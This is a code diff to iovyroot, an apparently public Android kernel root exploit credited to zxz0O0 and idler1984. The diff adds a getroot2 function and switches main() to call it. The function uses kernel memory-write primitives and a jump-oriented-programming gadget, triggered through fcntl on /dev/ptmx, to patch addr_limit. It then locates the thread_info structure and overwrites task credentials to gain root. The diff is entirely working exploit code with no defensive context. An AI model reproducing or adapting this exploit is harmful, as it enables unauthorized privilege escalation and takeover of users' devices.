@@ -373,18 +373,58 @@ end:
 	close(dev);
 	return ret;
 }
+
+int getroot2(struct offsets2* o)
+{
+	int ret = 1;
+	int dev;
+	unsigned long fp;
+	struct thread_info* ti;
+
+	printf("[+] Installing patch addr_limit JOP\n");
+	if(write_at_address(o->check_flags, (long)o->patch_addr_limit_joploc))
+		return 1;
+
+	preparejop2(MMAP_START, o);
+	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
+		return 1;
+
+	printf("[+] Patching addr_limit\n");
+	fcntl(dev, F_SETFL, MMAP_START);
+
+	printf("[+] Removing patch addr_limit JOP\n");
+	if(writel_at_address_pipe(o->check_flags, 0))
+		goto end;
+
+	printf("[+] Installing get_threadinfo JOP\n");
+	if(writel_at_address_pipe(o->check_flags, (unsigned long)o->get_threadinfo_joploc))
+		goto end;
+
+	fp = (unsigned)fcntl(dev, F_SETFL, MMAP_START);
+	fp += KERNEL_START;
+	ti = get_thread_info(fp);
+
+	if((ret = modify_task_cred_uc(ti)))
+		goto end;
+
+	ret = 0;
+end:
+	close(dev);
+	return ret;
+}
+
 #endif
 
 int main(int argc, char* argv[])
 {
 	unsigned int i;
 	int ret = 1;
-	struct offsets* o;
+	struct offsets2* o;
 
 	printf("iovyroot by zxz0O0\n");
 	printf("poc by idler1984\n\n");
 
-	if(!(o = get_offsets()))
+	if(!(o = get_offsets2()))
 		return 1;
 	if(setfdlimit())
 		return 1;
@@ -395,7 +435,7 @@ int main(int argc, char* argv[])
 	if(initmappings())
 		return 1;
 
-	ret = getroot(o);
+	ret = getroot2(o);
 	//let the threads end
 	sleep(1);
 
